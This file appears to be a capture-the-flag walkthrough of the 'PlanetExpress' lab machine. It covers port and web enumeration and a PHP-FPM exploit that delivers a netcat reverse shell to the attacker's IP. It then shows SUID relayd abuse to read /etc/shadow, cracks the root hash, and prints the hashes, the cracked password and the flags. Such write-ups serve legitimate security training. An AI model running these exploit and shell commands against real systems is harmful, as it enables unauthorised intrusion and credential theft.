@@ -1,0 +1,151 @@
+																							              PlanetExpress Walkthrough
+																										
+Attacker's Machine: 192.168.45.5
+Victim's Machine: 192.168.232.205
+export IP=192.168.232.205
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+2. nmap -Pn -n -sC -sV -p22,25,80,9000 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
+|_http-generator: Pico CMS
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: PlanetExpress - Coming Soon !
+9000/tcp open  cslistener?
+Service Info: OS: Linux;
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000   <!-- nothing -->
+
+
+Vulnerability Assessment <!-- nothing -->
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+/.gitignore         // Linux
+								*~
+								*.swp
+
+								# Windows
+								Thumbs.db
+								desktop.ini
+
+								# Mac OS X
+								.DS_Store
+								._*
+
+								# Composer
+								/composer.phar
+								/vendor
+
+nikto --url $IP 
+
+
+Port 80 Enumeration
+Files  
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429 -t 30 -R3 "http://$IP/FUZZ"
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 30 "http://$IP/FUZZ"
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 -t 30 "http://$IP/FUZZ"
+gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/big.txt  -o gobuster.txt -t 50 -x zip,php,txt 
+
+000000017:   200        15 L     18 W       111 Ch      ".gitignore"                                                                                    
+000000728:   301        9 L      28 W       319 Ch      "assets"                                                                                        
+000001209:   301        9 L      28 W       319 Ch      "config"                                                                                        
+000001241:   301        9 L      28 W       320 Ch      "content"                                                                                       
+000002193:   200        139 L    364 W      5176 Ch     "index.php"                                                                                     
+000003151:   301        9 L      28 W       320 Ch      "plugins"                                                                                       
+000003710:   403        9 L      28 W       280 Ch      "server-status"                                                                                 
+000004137:   301        9 L      28 W       319 Ch      "themes"                                                                                        
+000004380:   301        9 L      28 W       319 Ch      "vendor"  
+
+ffuf -c -w /usr/share/wordlists/last_resort.txt -u http://$IP/config/FUZZ -t 500  
+
+/config.yml
+
+##
+# Plugins: https://github.com/picocms/Pico/tree/master/plugins
+
+#PicoTest:
+#  enabled: true 
+
+Let's try the path: http://192.168.236.205/plugins/PicoTest.php
+
+
+Directories 
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404 -t 30 "http://$IP/FUZZ/"
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 30 "http://$IP/FUZZ/"
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://$IP/FUZZ/"
+
+Port 80 technologies to be researched
+Pico CMS
+
+NOthing so far, search online port port 9000.
+
+
+PHP-FPM - 9000
+
+https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
+
+For this exploit we need the location of the configuration file. Check the http://192.168.236.205/plugins/PicoTest.php so see if we find the configuration file.
+
+$_SERVER['SCRIPT_FILENAME']	/var/www/html/planetexpress/plugins/PicoTest.php
+
+chmod +x fpm.py
+
+python fpm.py -c "<?php passthru('nc 192.168.45.5 80 -e /bin/bash'); ?>" -p 9000 192.168.236.205 /var/www/html/planetexpress/plugins/PicoTest.php
+nc -lvnp 80
+
+You kinda need to brute force the folders /config, /assets and /plugins using different wordlists
+
+Got Shell
+
+cd /home/astro 
+cat local.txt             // 6447f7caeca1763b222471d2cf1b56a2
+
+Privilege Escalation
+
+ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/sbin/relayd
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/gpasswd
+
+relayd -h
+Options:
+  -C [file]           read config from file   // Aparently we can read any file from the server.
+  
+# Let's test this theory!
+
+ls -lsa /etc/shadow
+-r--r-----
+
+relayd -C /etc/shadow
+ls -lsa /etc/shadow
+-rw-r--r--        // nice
+
+root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1
+astro:$6$3c/stP2hxnireZRa$8Byaa52GnSq5BEVJtCrh2ZAKNSzYRvFuDEb2q2jk8hsJH91qQ6zgtUCxAZ.NgssBCJ7I8DURme/kd7MSkNl5f/
+
+# grab the contents of etc/passwd and etc/shadow
+
+unshadow passwd shadow > hash.txt
+leave the root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+neverwant2saygoodbye
+
+
+su root
+neverwant2saygoodbye
+cat /root/proof.txt     //   c218f2f206b7da3d9f0d87a5f7dfcabe
+
